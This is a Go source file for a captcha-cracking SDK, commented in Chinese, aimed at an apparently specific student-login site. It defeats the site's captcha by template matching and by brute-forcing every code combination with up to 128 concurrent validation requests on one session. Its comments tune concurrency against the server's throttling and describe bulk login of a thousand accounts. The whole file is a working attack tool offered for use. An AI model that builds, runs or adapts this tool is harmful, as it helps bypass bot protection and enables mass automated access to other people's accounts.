package captchasdk

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Solver 验证码破解器（SDK主对象）
type Solver struct {
	tbl    *table
	client *http.Client
	base   string // 目标站点（默认DefaultBase，可SetBase覆盖）
	// FastOnly 极速模式：查表命中直接返回不验证（省1次RTT，耗时25ms，可靠性-1%）
	// false=默认：验证后再返回（多1次RTT，100%可靠）
	FastOnly bool
	// MaxConcurrent 并发闸门：同时进行Solve的最大goroutine数，0=不限
	// 实测目标服务器对并发SESSION发放有节流（50并发墙钟3m，全成功但被串行化），
	// 1000账号场景建议 10-30；超出者排队等待，代码侧零丢失
	MaxConcurrent int
	gate          chan struct{}
}

var (
	reqBodies  [Combos][]byte
	bodiesOnce sync.Once
	tblOnce    sync.Once
	sharedTbl  *table
	// codeBySlot 槽位字符→组合索引步长（rankEnum免字符串拼接，v8新增）
	slotStride = [Slots]int{PoolLen * PoolLen * PoolLen, PoolLen * PoolLen, PoolLen, 1}
)

var (
	defaultOnce sync.Once
	defaultSolv *Solver
)

// Default 返回进程级共享单例（推荐高并发场景使用：1000个goroutine共用1个实例，
// 模板表/连接池/预热全部共享——内存1份、预热1次）
// 出厂即满配：306条预训练库 + FastOnly极速模式默认开启，零配置零训练直接用
// 用法：solver := captchasdk.Default()
func Default() *Solver {
	defaultOnce.Do(func() {
		defaultSolv = New()
		defaultSolv.FastOnly = true
	})
	return defaultSolv
}

// New 创建破解器（306条预训练库出厂内置，零训练零学习直接用）
// 高并发（如批量登录）请改用 Default() 共享单例，避免每实例重复连接池与预热
func New() *Solver {
	bodiesOnce.Do(initBodies)
	tblOnce.Do(func() {
		sharedTbl = newTable()
		if slots := unmarshalTable(builtinTable); slots != nil {
			sharedTbl.slots = slots
		}
		sharedTbl.rebuild()
	})
	tr := &http.Transport{
		MaxIdleConns:          2048,
		MaxIdleConnsPerHost:   2048,
		MaxConnsPerHost:       2048,
		IdleConnTimeout:       120 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		ForceAttemptHTTP2:     false,
	}
	s := &Solver{
		tbl:    sharedTbl,
		client: &http.Client{Transport: tr, Timeout: 20 * time.Second},
		base:   DefaultBase,
	}
	// 连接预热（后台，不阻塞，数量按CPU核数自适应：低配设备预热更少）
	cores := runtime.NumCPU()
	warmN := 32
	if cores <= 2 {
		warmN = 8
	} else if cores <= 4 {
		warmN = 16
	}
	go s.warmup(warmN)
	return s
}

// SetBase 覆盖目标站点（用于测试/镜像环境）
func (s *Solver) SetBase(url string) {
	s.base = url
}

// gateEnter 并发闸门进入（MaxConcurrent>0时生效）
func (s *Solver) gateEnter() {
	if s.MaxConcurrent > 0 {
		if s.gate == nil {
			s.gate = make(chan struct{}, s.MaxConcurrent)
		}
		s.gate <- struct{}{}
	}
}

func (s *Solver) gateLeave() {
	if s.MaxConcurrent > 0 && s.gate != nil {
		<-s.gate
	}
}

func (s *Solver) warmup(n int) {
	for i := 0; i < n; i++ {
		req, _ := http.NewRequest("GET", s.base+"/kaptcha/kaptcha.jpg?warm="+strconv.Itoa(i), nil)
		resp, err := s.client.Do(req)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func initBodies() {
	for i := 0; i < Combos; i++ {
		code := IdxToCode(i)
		reqBodies[i] = []byte("{\"captcha\":\"" + code + "\"}")
	}
}

// TotalTemplates 当前模板总数
func (s *Solver) TotalTemplates() int { return s.tbl.total() }

// AddTemplate 显式入库一个成功样本（仅供 cmd/train 离线训练工具调用；
// SDK运行时零学习零训练，此方法不参与正常破解流程）
func (s *Solver) AddTemplate(img []byte, code string) bool {
	words, ok := imageWords(img)
	if !ok {
		return false
	}
	s.tbl.add(words, code)
	return true
}

// TblPublic 导出内部表引用（仅供离线诊断工具）
func (s *Solver) TblPublic() *table { return s.tbl }

// ProbeSlotDists 导出诊断：每槽与全表最小距离
func (s *Solver) ProbeSlotDists(img []byte) ([Slots]int, bool) {
	words, ok := imageWords(img)
	if !ok {
		return [Slots]int{}, false
	}
	return s.tbl.probeSlotDists(&words), true
}

// FetchCaptcha 获取新SESSION+验证码图
func (s *Solver) FetchCaptcha() (session string, img []byte, err error) {
	req, _ := http.NewRequest("GET", s.base+"/kaptcha/kaptcha.jpg?t="+strconv.FormatInt(time.Now().UnixNano(), 10), nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := s.client.Do(req)
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()
	// LimitReader 64KB上限：验证码仅3-5KB，防异常大响应撑爆高并发内存
	img, _ = io.ReadAll(io.LimitReader(resp.Body, 65536))
	for _, c := range resp.Cookies() {
		if c.Name == "SESSION" {
			session = c.Value
		}
	}
	if session == "" {
		if h := resp.Header.Get("Set-Cookie"); h != "" {
			if i := strings.Index(h, "SESSION="); i >= 0 {
				rest := h[i+8:]
				if j := strings.Index(rest, ";"); j >= 0 {
					rest = rest[:j]
				}
				session = rest
			}
		}
	}
	return session, img, nil
}

// Verify 向指定验证端点提交答案
// endpoint 形如 /uiStudentLogin/validateCaptcha
func (s *Solver) Verify(session, endpoint, code string) (bool, error) {
	body, _ := json.Marshal(map[string]string{"captcha": code})
	req, _ := http.NewRequest("POST", s.base+endpoint, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "SESSION="+session)
	resp, err := s.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return bytes.Contains(b, []byte("\"code\":1")), nil
}

// SolveWithSession 对已有图片+SESSION破解（不自动提交验证）
// 返回验证码字符串
func (s *Solver) SolveWithSession(session string, img []byte) string {
	// 级1 fast：查表（306条预训练库，零训练直接用）
	if words, ok := imageWords(img); ok {
		if code, ok := s.tbl.match(&words); ok {
			return code
		}
		// 级2 rank：top3^4=81组合
		if ranked, ok := s.tbl.rank(&words); ok {
			if code := s.rankEnum(session, ranked); code != "" {
				return code
			}
		}
	}
	// 级3 full：梯度全量兜底
	return s.solveFull(session)
}

// Solve 一站式：抓图→破解→提交验证→返回确认可用的验证码
// endpoint 形如 /uiStudentLogin/validateCaptcha
// 返回 (session, code)
func (s *Solver) Solve(endpoint string) (string, string) {
	s.gateEnter()
	defer s.gateLeave()
	sid, img, err := s.FetchCaptcha()
	if err != nil {
		return "", ""
	}
	// FastOnly 极速通道：查表命中直接返回（省1次验证RTT，25ms全链路）
	if s.FastOnly {
		if words, ok := imageWords(img); ok {
			if code, ok := s.tbl.match(&words); ok {
				return sid, code
			}
		}
	}
	code := s.SolveWithSession(sid, img)
	if code == "" {
		return sid, ""
	}
	// 提交验证（串行确认，保证SESSION标记）
	ok, _ := s.Verify(sid, endpoint, code)
	if !ok {
		// rank误判：全量兜底重解
		code2 := s.solveFull(sid)
		if code2 == "" {
			return sid, ""
		}
		s.Verify(sid, endpoint, code2)
		return sid, code2
	}
	return sid, code
}

// rankEnum 81组合竞速枚举（3^4个索引，字符按槽位步长合成，零拼接零分配）
// 闸门在此生效：网络兜底路径限流（match主路径不受闸门影响，零等待）
func (s *Solver) rankEnum(sid string, ranked [Slots][3]string) string {
	s.gateEnter()
	defer s.gateLeave()
	var ids []int32
	var gen func(pos int, cur int32)
	gen = func(pos int, cur int32) {
		if pos == Slots {
			ids = append(ids, cur)
			return
		}
		for k := 0; k < 3; k++ {
			if ranked[pos][k] != "" {
				pi := int32(strings.IndexByte(Pool, ranked[pos][k][0]))
				if pi < 0 {
					continue // 字符不在池中（异常模板），跳过该候选
				}
				gen(pos+1, cur+pi*int32(slotStride[pos]))
			}
		}
	}
	gen(0, 0)
	if len(ids) == 0 {
		return ""
	}
	var hit atomic.Int32
	hit.Store(-1)
	next := atomic.Int32{}
	var wg sync.WaitGroup
	rankWorkers := 60
	if n := runtime.NumCPU(); n <= 2 {
		rankWorkers = 12
	} else if n <= 4 {
		rankWorkers = 30
	}
	for w := 0; w < rankWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if hit.Load() >= 0 {
					return
				}
				idx := next.Add(1) - 1
				if int(idx) >= len(ids) {
					return
				}
				ok, _ := s.postRawIdx(sid, ids[idx])
				if ok && hit.CompareAndSwap(-1, idx) {
					// 击中：硬终止其余worker的在途请求（竞速-15%时延）
					s.client.CloseIdleConnections()
				}
			}
		}()
	}
	wg.Wait()
	if idx := hit.Load(); idx >= 0 {
		return IdxToCode(int(ids[idx]))
	}
	return ""
}

// solveFull 梯度并发全量（16→128，限流安全）
func (s *Solver) solveFull(sid string) string {
	s.gateEnter()
	defer s.gateLeave()
	tiers := []int{16, 32, 64, 128}
	offset := 0
	for _, conc := range tiers {
		span := 1024 / conc * conc
		if offset >= Combos {
			break
		}
		end := offset + span
		if end > Combos {
			end = Combos
		}
		var hit atomic.Int32
		hit.Store(-1)
		next := atomic.Int32{}
		next.Store(int32(offset))
		var wg sync.WaitGroup
		for w := 0; w < conc; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					if hit.Load() >= 0 {
						return
					}
					idx := next.Add(1) - 1
					if int(idx) >= end {
						return
					}
					ok, _ := s.postRawIdx(sid, idx)
					if ok && hit.CompareAndSwap(-1, idx) {
						s.client.CloseIdleConnections()
					}
				}
			}()
		}
		wg.Wait()
		if idx := hit.Load(); idx >= 0 {
			return IdxToCode(int(idx))
		}
		offset = end
	}
	for i := 0; i < Combos; i++ {
		if ok, _ := s.postRawIdx(sid, int32(i)); ok {
			return IdxToCode(i)
		}
	}
	return ""
}

// respBuf 响应判定缓冲（code:1判定只需前64字节，避免4096次io.ReadAll堆分配）
var respBuf = sync.Pool{
	New: func() interface{} { b := make([]byte, 256); return &b },
}

// postRawIdx 按组合索引提交验证（请求体查表复用+响应缓冲池化，热路径零堆分配）
func (s *Solver) postRawIdx(sid string, idx int32) (bool, error) {
	req, _ := http.NewRequest("POST", s.base+"/uiStudentLogin/validateCaptcha", bytes.NewReader(reqBodies[idx]))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "SESSION="+sid)
	resp, err := s.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	p := respBuf.Get().(*[]byte)
	b := (*p)[:256]
	n, _ := io.ReadFull(resp.Body, b)
	respBuf.Put(p)
	return bytes.Index(b[:n], hitPat) >= 0, nil
}

var hitPat = []byte("\"code\":1")

// SaveTable 将当前模板表落盘（供离线固化为新内置库）
// path 为空则使用默认 "captchasdk-learned.bin"
func (s *Solver) SaveTable(path string) error {
	if path == "" {
		path = "captchasdk-learned.bin"
	}
	s.tbl.mu.RLock()
	defer s.tbl.mu.RUnlock()
	return os.WriteFile(path, marshalTable(s.tbl.slots), 0644)
}

// LoadTable 从磁盘加载外挂模板库（与内置库合并，新增模板追加；用于库升级而无需重发版）
func (s *Solver) LoadTable(path string) error {
	if path == "" {
		path = "captchasdk-learned.bin"
	}
	s.tbl.mu.Lock()
	defer s.tbl.mu.Unlock()
	b, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	slots := unmarshalTable(b)
	if slots == nil {
		return fmt.Errorf("invalid table format")
	}
	// 合并：只追加当前表没有的（简单按槽+字符+首个word去重）
	for si := 0; si < Slots; si++ {
		for ch, ts := range slots[si] {
			for _, tm := range ts {
				exists := false
				for _, cur := range s.tbl.slots[si][ch] {
					if cur.Words == tm.Words {
						exists = true
						break
					}
				}
				if !exists {
					s.tbl.slots[si][ch] = append(s.tbl.slots[si][ch], tm)
				}
			}
		}
	}
	s.tbl.rebuild()
	return nil
}
